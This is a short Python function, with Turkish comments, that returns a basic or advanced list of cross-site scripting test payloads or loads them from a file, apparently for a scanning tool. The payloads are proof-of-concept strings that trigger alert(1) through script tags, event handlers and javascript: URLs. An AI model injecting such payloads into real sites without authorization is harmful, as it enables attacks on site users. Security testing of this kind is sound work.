def get_payloads(level="default", from_file=None):
    """
    Payload listesi döndürür.
    
    Args:
        level (str): 'default' veya 'advanced'
        from_file (str): Dosya yolu verilirse oradan payloadları okur.
    
    Returns:
        list: Payload listesi
    """
    if from_file:
        try:
            with open(from_file, "r", encoding="utf-8") as f:
                lines = f.read().splitlines()
                payloads = [line.strip() for line in lines if line.strip()]
                if payloads:
                    return payloads
                else:
                    print(f"[!] Uyarı: '{from_file}' dosyası boş.")
        except Exception as e:
            print(f"[!] Dosya okunamadı: {e}")

    default_payloads = [
        "<script>alert(1)</script>",
        "'\"><img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "\" onmouseover=alert(1) x=\"",
        "<body onload=alert(1)>",
    ]

    advanced_payloads = default_payloads + [
        "<iframe src='javascript:alert(1)'></iframe>",
        "<details open ontoggle=alert(1)>",
        "<math href='javascript:alert(1)'>",
        "<marquee/onstart=alert(1)>",
    ]

    if level == "advanced":
        return advanced_payloads
    else:
        return default_payloads
